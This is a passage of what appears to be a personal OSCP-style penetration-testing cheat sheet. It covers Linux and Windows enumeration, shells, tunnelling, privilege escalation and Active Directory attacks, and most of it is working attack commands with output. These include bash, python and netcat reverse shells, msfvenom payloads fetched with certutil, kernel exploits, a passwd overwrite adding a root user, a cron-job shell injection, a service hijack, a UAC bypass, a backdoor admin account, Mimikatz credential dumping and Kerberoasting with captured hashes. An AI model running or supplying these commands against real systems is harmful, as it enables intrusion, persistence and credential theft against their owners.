find / -xdev -type f -perm -0002 -ls 2> /dev/null
````
### Finding SUID Binaries
````
find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
````
### Crontab 
````
cat /etc/crontab
````
### NFS
````
cat /etc/exports
````
## Windows System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/232/232411.png" width="40" height="40" />
### Windows Binaries
````
sudo apt install windows-binaries
````
### Basic Enumeration of the System
````
# Basics
systeminfo
hostname

# Who am I?
whoami
echo %username%

# What users/localgroups are on the machine?
net users
net localgroups

# More info about a specific user. Check if user has privileges.
net user user1

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain <Group Name>

# Firewall
netsh firewall show state
netsh firewall show config

# Network
ipconfig /all
route print
arp -A

# How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn
````
````
dir /a-r-d /s /b
move "C:\Inetpub\wwwroot\winPEASx86.exe" "C:\Directory\thatisWritable\winPEASx86.exe"
````
#### Windows Services - insecure file persmissions
````
accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command refer to exploits below
````
### Clear text passwords
````
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
````
````
dir /s /p proof.txt
````

## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
### Linux
#### Pimp my shell
````
which python
which python2
which python3
python -c ‘import pty; pty.spawn(“/bin/bash”)’
````
````
which socat
socat file:`tty`,raw,echo=0 tcp-listen:4444 #On Kali Machine
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444 #On Victim Machine
````
````
Command 'ls' is available in '/bin/ls'
export PATH=$PATH:/bin
````
````
The command could not be located because '/usr/bin' is not included in the PATH environment variable.
export PATH=$PATH:/usr/bin
````
````
-rbash: $'\r': command not found
BASH_CMDS[a]=/bin/sh;a
````
````
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
````
#### Reverse shells
````
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
````
````
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 #worked
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $IP",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' #worked
````
### Windows
#### Stable shell
````
nc -nlvp 9001
.\nc.exe <your kali IP> 9001 -e cmd
C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 80 -e C:\WINDOWS\System32\cmd.exe
````
#### Powershell
````
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
echo "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444" >> Invoke-PowerShellTcp.ps1
powershell -executionpolicy bypass -file Invoke-PowerShellTcp.ps1 #Once on victim run this
````
## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
````
https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/pivoting-basics/
````
### Commands
````
ps aux | grep ssh
kill (enter pid #)
````
### Tools
#### sshuttle
##### Linux Enviorment
````
sshuttle -r sean@10.11.1.251 10.1.1.0/24 #run on your kali machine to proxy traffic into the IT Network
#In this situation we have rooted a linux machine got user creds and can establish an sshuttle
#You can visit the next network as normal and enumerate it as normal.
#best used for everything else but nmap
````
###### Transfering files via sshuttle
````
sshuttle -r sean@10.11.1.251 10.1.1.0/24 #1 Port Foward to our machine
python3 -m http.server 800 # on our kali machine
ssh megan@10.1.1.27 curl http://192.168.119.140:800/linpeas.sh -o /tmp/linpeas.sh #2 on our kali machine to dowload files
````
#### ssh port foward
##### Linux Enviorment
````
sudo echo "socks4 127.0.0.1 80" >> /etc/proxychains.conf 
[7:06 PM]
ssh -NfD 80 sean@10.11.1.251 10.1.1.0/24
[7:07 PM]
proxychains nmap -p- --min-rate=1000 10.1.1.27 -Pn #best used for nmap only
proxychains nmap -sT --top-ports 1000 --min-rate=1000 -Pn  10.1.1.68 -v # better scan
proxychains nmap -A -sT -p445 -Pn 10.1.1.68 # direct scans of ports this is best used when enumerating each port
````
#### ssh Local port fowarding
##### Info 
````
In local port forwarding, you are forwarding a port on your local machine to a remote machine. This means that when you connect to a remote server using SSH and set up local port forwarding, any traffic sent to the specified local port will be forwarded over the SSH connection to the remote machine and then forwarded to the target service or application.
````
##### Example
````
ssh -L 6070:127.0.0.1:2049 megan@10.1.1.27 -N
````
````
This command creates an SSH tunnel between your local computer and a remote computer at IP address 10.1.1.27, with the user "megan". The tunnel forwards all traffic sent to port 6070 on your local computer to port 2049 on the remote computer, which is only accessible via localhost (127.0.0.1). The "-N" flag tells SSH to not execute any commands after establishing the connection, so it will just stay open and forward traffic until you manually terminate it. This is commonly used for securely accessing network services that are not directly accessible outside of a certain network or firewall.

#notes we did not use proxychains on this. just as the setup was above
````
#### Chisel
##### Chisel Windows
````
https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_windows_amd64.gz #Windows Client
cp /home/kali/Downloads/chisel_1.7.3_windows_amd64.gz .
gunzip -d *.gz
chmod +x chisel_1.7.3_windows_amd64
mv chisel_1.7.3_windows_amd64 chisel.exe
````
##### Chisel Linux 32bit
````
https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_386.gz
cp /home/kali/Downloads/chisel_1.8.1_linux_386.gz .
gunzip -d *.gz
chmod +x chisel_1.8.1_linux_386
mv chisel_1.8.1_linux_386 chisel32
````
##### Chisel Nix
````
locate chisel
/usr/bin/chisel #Linux Server
````
###### Windows to Nix
````
chisel server --reverse -p 1234 #On your kali machine
vim /etc/proxychains.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 8080
socks5 127.0.0.1 1080
certutil -urlcache -split -f http://<your $IP>:<Your Porty>/chisel.exe
.\chisel.exe client <your kali $IP>:1234 R:socks #On victim machine
proxychains psexec.py victim:password@<victim $IP> cmd.exe
````

## Compiling Exploit Codes <img src="https://cdn-icons-png.flaticon.com/128/868/868786.png" width="40" height="40" />
### Old exploits .c
````
sudo apt-get install gcc-multilib
sudo apt-get install libx11-dev:i386 libx11-dev
gcc 624.c -m32 -o exploit
````
## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
### Kernel Expoits
#### CVE-2022-2588
````
git clone https://github.com/Markakd/CVE-2022-2588.git
wget http://192.168.119.140/exp_file_credential
chmod +x exp_file_credential
./exp_file_credential
su user
Password: user
id
uid=0(user) gid=0(root) groups=0(root)
````
#### CVE-2016-5195
````
https://github.com/firefart/dirtycow
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
uname -a
Linux humble 3.2.0-4-486 #1 Debian 3.2.78-1 i686 GNU/Linux
gcc -pthread dirty.c -o dirty -lcrypt
gcc: error trying to exec 'cc1': execvp: No such file or directory
locate cc1
export PATH=$PATH:/usr/lib/gcc/i486-linux-gnu/4.7/cc1
./dirty
su firefart
````
#### CVE-2009-2698
````
uname -a
Linux phoenix 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 athlon i386 GNU/Linux
bash-3.00$ id 
id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-3.00$ ./exp
./exp
sh-3.00# id
id
uid=0(root) gid=0(root) groups=48(apache)
````
````
https://github.com/MrG3tty/Linux-2.6.9-Kernel-Exploit
````
#### CVE-2021-4034
````
uname -a
Linux dotty 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
````
````
https://github.com/ly4k/PwnKit/blob/main/PwnKit.sh
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit #local
chmod +x PwnKit #local
./PwnKit #Victim Machine
````
#### CVE-2021-4034
````
wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
````
#### [CVE-2012-0056] memodipper
````
wget https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/memodipper/memodipper.c
gcc memodipper.c -o memodipper #compile on the target not kali
````
### NFS Shares
#### cat /etc/exports
##### no_root_squash
````
Files created via NFS inherit the remote user’s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the “nobody” user.

Notice that the /srv share has root squashing disabled. Because of this, on our local machine we can create a mount point and mount the /srv share.

-bash-4.2$ cat /etc/exports
/srv/Share 10.1.1.0/24(insecure,rw)
/srv/Share 127.0.0.1/32(no_root_squash,insecure,rw)

"no_root_squash"
````
##### Setup
````
sshuttle -r sea@10.11.1.251 10.1.1.0/24 #setup
ssh -L 6070:127.0.0.1:2049 megan@10.1.1.27 -N #tunnel for 127.0.0.1 /srv/Share
mkdir /mnt/tmp
scp megan@10.1.1.27:/bin/bash . #copy over a reliable version of bash from the victim
chown root:root bash; chmod +s bash #change ownership and set sticky bit
ssh megan@10.1.1.27 #login to victim computer
````
##### Exploit
````
cd /srv/Share
ls -la #check for sticky bit
./bash -p #how to execute with stick bit
whoami
````
### Bad File permissions
#### cat /etc/shadow
````
root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7:::                                                                                                              vcsa:!!:15422:0:99999:7:::
pcap:!!:15422:0:99999:7:::
````
### sudo -l / SUID Binaries
#### (root) NOPASSWD: /usr/bin/nmap
````
bash-3.2$ id     
id
uid=100(asterisk) gid=101(asterisk)
bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
````
#### /usr/bin/cp
````
find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
cat /etc/passwd #copy the contents of this file your kali machine
root:x:0:0:root:/root:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin

openssl passwd -1 -salt ignite pass123
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
echo 'hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' >> passwd

cat passwd 
root:x:0:0:root:/root:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
python3 -m http.server #Host the new passwd file
curl http://192.168.119.168/passwd -o passwd #Victim Machine
cp passwd /etc/passwd #This is where the attack is executed

bash-4.2$ su hacker
su hacker
Password: pass123

[root@pain tmp]# id
id
uid=0(root) gid=0(root) groups=0(root)
````
### cat /etc/crontab
#### bash file
````
useradm@mailman:~/scripts$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    /home/useradm/scripts/cleanup.sh > /dev/null 2>&1

echo " " > cleanup.sh
echo '#!/bin/bash' > cleanup.sh
echo 'bash -i >& /dev/tcp/192.168.119.168/636 0>&1' >> cleanup.sh
nc -nlvp 636 #wait 5 minutes
````

## Windows PrivEsc <img src="https://vangogh.teespring.com/v3/image/9YwsrdxKpMa_uTATdBk8_wFGxmE/1200/1200.jpg" width="40" height="40" />
### Windows Service - Insecure Service Permissions
#### Windows XP SP0/SP1 Privilege Escalation
````
C:\>systeminfo
systeminfo

Host Name:                 BOB
OS Name:                   Microsoft Windows XP Professional
OS Version:                5.1.2600 Service Pack 1 Build 2600
````
````
https://sohvaxus.github.io/content/winxp-sp1-privesc.html
unzip Accesschk.zip
ftp> binary
200 Type set to I.
ftp> put accesschk.exe
local: accesschk.exe remote: accesschk.exe
````
##### Download and older version accesschk.exe
````
https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip
````
##### Enumeration
````
accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS

accesschk.exe /accepteula -ucqv upnphost #command
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
        SERVICE_ALL_ACCESS
        
sc qc upnphost #command
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : NT AUTHORITY\LocalService
        
 sc query SSDPSRV #command

SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
        STATE              : 1  STOPPED 
                                (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 1077       (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

sc config SSDPSRV start= auto #command
[SC] ChangeServiceConfig SUCCESS
````
##### Attack setup
````
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 443 -e C:\WINDOWS\System32\cmd.exe" #command
[SC] ChangeServiceConfig SUCCESS

sc config upnphost obj= ".\LocalSystem" password= "" #command
[SC] ChangeServiceConfig SUCCESS

sc qc upnphost #command
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 443 -e C:\WINDOWS\System32\cmd.exe  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : LocalSystem

nc -nlvp 443 #on your kali machine

net start upnphost #Last command to get shell
````
##### Persistance
Sometime our shell can die quick, try to connect right away with nc.exe binary to another nc -nlvp listner
````
nc -nlvp 80

C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 80 -e C:\WINDOWS\System32\cmd.exe #command
(UNKNOWN) [192.168.119.140] 80 (?) open
````
### User Account Control (UAC) Bypass
UAC can be bypassed in various ways. In this first example, we will demonstrate a technique that
allows an administrator user to bypass UAC by silently elevating our integrity level from medium
to high. As we will soon demonstrate, the fodhelper.exe509 binary runs as high integrity on Windows 10
1709. We can leverage this to bypass UAC because of the way fodhelper interacts with the
Windows Registry. More specifically, it interacts with registry keys that can be modified without
administrative privileges. We will attempt to find and modify these registry keys in order to run a
command of our choosing with high integrity. Its important to check the system arch of your reverse shell.
````
whoami /groups #check your integrity level/to get high integrity level to be able to run mimikatz and grab those hashes  
````
````
C:\Windows\System32\fodhelper.exe #32 bit
C:\Windows\SysNative\fodhelper.exe #64 bit
````
#### Powershell
Launch Powershell and run the following
````
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\ted\shell.exe" -Force
````
run fodhelper setup and nc shell and check your priority
````
C:\Windows\System32\fodhelper.exe
````
#### cmd.exe
##### Enumeration
````
whoami /groups
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
````
##### Exploitation
````
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command #victim machine
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ #victim machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe #on your kali
certutil -urlcache -split -f http://192.168.119.140:80/shell.exe C:\Windows\Tasks\backup.exe #victim machine
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Tasks\backup.exe" /f #victim machine
nc -nlvp 80 #on your kali
C:\Windows\system32>fodhelper.exe #victim machine
````
##### Final Product
````
whoami /groups
Mandatory Label\High Mandatory Level       Label            S-1-16-12288 
````
### Leveraging Unquoted Service Paths
Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around unquoted service paths.1 We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them. Please note that this section of the module will not be reproducible on your dedicated client. However, you will be able to use this technique on various hosts inside the lab environment.

As we have seen in the previous section, each Windows service maps to an executable file that will be run when the service is started. Most of the time, services that accompany third party software are stored under the C:\Program Files directory, which contains a space character in its name. This can potentially be turned into an opportunity for a privilege escalation attack.
#### cmd.exe
````
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """
````
In this example we see than ZenHelpDesk is in program files as discussed before and has an unqouted path.
````
C:\Users\ted>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """
mysql                                                                               mysql                                     C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql                          Auto       
ZenHelpDesk                                                                         Service1                                  C:\program files\zen\zen services\zen.exe                                                              Auto       

C:\Users\ted>
````
check our permission and chech which part of the path you have write access to.
````
dir /Q
dir /Q /S
````
````
C:\Program Files\Zen>dir /q
 Volume in drive C has no label.
 Volume Serial Number is 3A47-4458

 Directory of C:\Program Files\Zen

02/15/2021  02:00 PM    <DIR>          BUILTIN\Administrators .
02/15/2021  02:00 PM    <DIR>          NT SERVICE\TrustedInsta..
02/10/2021  02:24 PM    <DIR>          BUILTIN\Administrators Zen Services
03/10/2023  12:05 PM             7,168 EXAM\ted               zen.exe
               1 File(s)          7,168 bytes
               3 Dir(s)   4,013,879,296 bytes free
````
Next we want to create a msfvenom file for a reverse shell and upload it to the folder where we have privledges over a file to write to. Start your netcat listner and check to see if you have shutdown privledges
````
sc stop "Some vulnerable service" #if you have permission proceed below
sc start "Some vulnerable service"#if the above worked then start the service again
sc qc "Some vulnerable service" #if the above failed check the privledges above "SERVICE_START_NAME"
whoami /priv #if the above failed check to see if you have shutdown privledges
shutdown /r /t 0 #wait for a shell to comeback
````
#### Powershell
#### Enumeration
````
https://juggernaut-sec.com/unquoted-service-paths/#:~:text=Enumerating%20Unquoted%20Service%20Paths%20by%20Downloading%20and%20Executing,bottom%20of%20the%20script%3A%20echo%20%27Invoke-AllChecks%27%20%3E%3E%20PowerUp.ps1 # follow this
````
````
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
````
````
Name               DisplayName                            StartMode PathName                                           
----               -----------                            --------- --------                                           
LSM                LSM                                    Unknown                                                      
NetSetupSvc        NetSetupSvc                            Unknown                                                      
postgresql-9.2     postgresql-9.2 - PostgreSQL Server 9.2 Auto      C:/exacqVisionEsm/PostgreSQL/9.2/bin/pg_ctl.exe ...
RemoteMouseService RemoteMouseService                     Auto      C:\Program Files (x86)\Remote Mouse\RemoteMouseS...
solrJetty          solrJetty                              Auto      C:\exacqVisionEsm\apache_solr/apache-solr\script...

````
````
move "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe" "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe.bak"
````
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe
Invoke-WebRequest -Uri "http://192.168.119.140:8000/shell.exe" -OutFile "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe"
````
````
get-service *exac*
stop-service ESMWebService*
start-service ESMWebService*
````
````
nc -nlvp 80
shutdown /r /t 0 /f #sometimes it takes a minute or two...
````


### Adding a user with high privs
````
net user hacker password /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net users #check the new user
````
````
impacket-secretsdump hacker:password@<IP of victim machine> -outputfile hashes 
rdekstop -u hacker -p password <IP of victim machine>
windows + R #Windows and R key at the same time
[cmd.exe] # enter exe file you want in the prompt
C:\Windows\System32\cmd.exe #or find the file in the file system and run it as Administrator
[right click and run as administrator]
````
### SeImpersonate
#### PrintSpoofer
````
whoami /priv
git clone https://github.com/dievus/printspoofer.git #copy over to victim
PrintSpoofer.exe -i -c cmd

c:\inetpub\wwwroot>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
````
````
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
System Type:               x64-based PC

````
### Pivoting
#### psexec.py
Using credentials that we wound for Alice we were able to psexec.py on my kali machine using chisel to Alices Account as she has higher privledges then my current user. Locally we were being blocked with psexec.exe by AV so this was our work around.
````
proxychains psexec.py alice:aliceishere@10.11.1.50 cmd.exe
````
````
C:\HFS>whoami
whoami
bethany\bethany
````
````
C:\Users\Bethany\Desktop>net user Bethany
Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
````
````
C:\Users\Bethany\Desktop>net users
net users

User accounts for \\BETHANY

-------------------------------------------------------------------------------
Administrator            alice                    Bethany                  
Guest                    
The command completed successfully
````
````
C:\Users\Bethany\Desktop>net user alice
Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
````
## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />
### third party cheat sheet
````
https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md#AD-Lateral-Movement-1
````
### Active Directory Enumeration <img src="https://cdn-icons-png.flaticon.com/512/9616/9616012.png" width="40" height="40" />
#### nmap
````
nmap -p80 --min-rate 1000 10.11.1.20-24 #looking for initial foothold
nmap -p88 --min-rate 1000 10.11.1.20-24 #looking for DC
````
#### Traditional Approach
````
net user #users on current computer
````
````
net user /domain #users in the current domain
````
````
net user <user>_admin /domain #Look for specific users on the domain
````
````
net group /domain #global groups in domains
````
```
net group "Domain Computers" /domain #All workstations and servers joined to the domain
````
````
net group "domain controllers" /domain #This is the domain controller you want to reach
````
### Active Directory Credential Hunting <img src="https://cdn-icons-png.flaticon.com/512/1176/1176601.png" width="40" height="40" />
#### cached storage credential attacks <img src="https://cdn-icons-png.flaticon.com/128/1486/1486513.png" width="40" height="40" />
Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In current versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS)1 memory space. If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse them to perform various actions.

##### MimiKatz <img src="https://cdn-icons-png.flaticon.com/128/1864/1864514.png" width="40" height="40" /> 
````
https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
````
````
unzip mimikatz_trunk.zip 
````
````
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
````
````
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
````
````
privilege::debug
````
````
sekurlsa::logonpasswords
````
Notice that we have two types of hashes highlighted in the output above. This will vary based on the functional level of the AD implementation. For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm. For instances running Windows Server 2008 or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available. On older operating systems like Windows 7, or operating systems that have it manually set, WDigest,9 will be enabled. When WDigest is enabled, running Mimikatz will reveal cleartext password alongside the password hashes.

SEKURLSA::Tickets – Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account.
Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).

Dumps all authenticated Kerberos tickets on a system.
Requires administrator access (with debug) or Local SYSTEM rights
````
sekurlsa::tickets
````
A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets. As already discussed, we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS and we can use Mimikatz to interact with and retrieve our own tickets and the tickets of other local users.

The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. On the other side, armed with a TGT ticket, we could request a TGS for specific resources we want to target within the domain. We will discuss how to leverage stolen or forged tickets later on in the module.
#### Service Account Attacks <img src="https://cdn-icons-png.flaticon.com/128/720/720234.png" width="40" height="40" />
Recalling the explanation of the Kerberos protocol, we know that when the user wants to access a resource hosted by a SPN, the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted through the password hash of the SPN.

When requesting the service ticket from the domain controller, no checks are performed on whether the user has any permissions to access the service hosted by the service principal name. These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. Then, since it is our own ticket, we can extract it from local memory and save it to disk.
##### PowerView Enumeration
````
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
````
````
import-module .\PowerView.ps1
````
````
Get-NetUser -SPN #Kerberoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Find-LocalAdminAccess #Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
````
##### Rubeus Exploitation
When we ran Rubeus it triggered a Keberos Auth request and we were able to use mimikatz after to get the ticket as well.
````
cp /opt/Ghostpack-CompiledBinaries/Rubeus.exe .
````
````
.\Rubeus.exe kerberoast /simple /outfile:hashes.txt
type hashes.txt
````
##### Cracking Rubeus SPN TGS-REP examples
##### Enumeration
````
Get-NetUser -SPN | select serviceprincipalname

serviceprincipalname           
--------------------           
kadmin/changepw                
HTTP/ExchangeService.xor.com   
HTTP/ExtMail.xor.com           
MSSQLSvc/xor-app23.xor.com:1433
````
##### Exploit
````
.\Rubeus.exe kerberoast /simple /outfile:hashes.txt
````
##### grab the tickets to your local kali
````
cat hashes.txt                                                                                                               
$krb5tgs$23$*sqlServer$xor.com$MSSQLSvc/xor-app23.xor.com:1433@xor.com*$C9EB7D90EF4CD11DC6B57F207EEEC53D$3C6AAE992D99A862602D56BB15F501433955BBF02C3A4CE0A34EA2DB2C3BD3F1F3438C556BC9333A1EE02960C5B0EDAB2611D8D7522C3851B5F3E662C93DD99E6CC31CD55C5E8AC7DD3158FE9F24DACE1F264952731326A3151484FD973CA619A1EE48785F1DC944C3AE6E089541FA10DD95916EB644EA7BA8B4F82630E514AA59FA2DB76C244B94277683BEA5CEA5B2C32BB992E57CDC22BFE2F1C4B564E1A17B48995E806323AC61E92713B5B73EBFDEF274653FC477EEF7C93F426C15390B977D80160AF23C87732604D844A935A941A307B7A4E8E5EF61D0DC89DEB63FA6FAAC2CA38DFC2A3E587073CA4B3A45EAFC11ECD006B02BFB4DCF27D830EDDB0E92425D6D6BD49101DB39385C9D8701BEBA68D7D4E56F49312AE2B5774C5D4D9FAB64FCAF3B8F51B4902E55727AB53AFDE7F6A2CFEE1D923BFC15D87A52E38998F4F11A82A7DBE449E800F4E3E70F6B55F659E4A88B6A4A5DC4C93946F7C96A4C3859F4232DD5DD8B1E11085C2C5769807782C6748B61E2B048CB6AC51E8FA0447D8A0BD0DC44274207AE72C892D863812650FC84F0D1AF5F49DD3DB591B5D5BADEBE3D221A2DBAAE26DFEA9A12E3ABAC24C57E496F2A570C0DA5C05CA3FF7045D105AF919E8224E29C4214743112AD8FC979DFA402FCFBD302CC101C5903F40577036AAD77838279B5EA5F976A68173AB24A24E65209CFE185E487C9993717B04723EA857AA1ACA1A2787E4A004B1664AD53C3185EF284FF13E3BF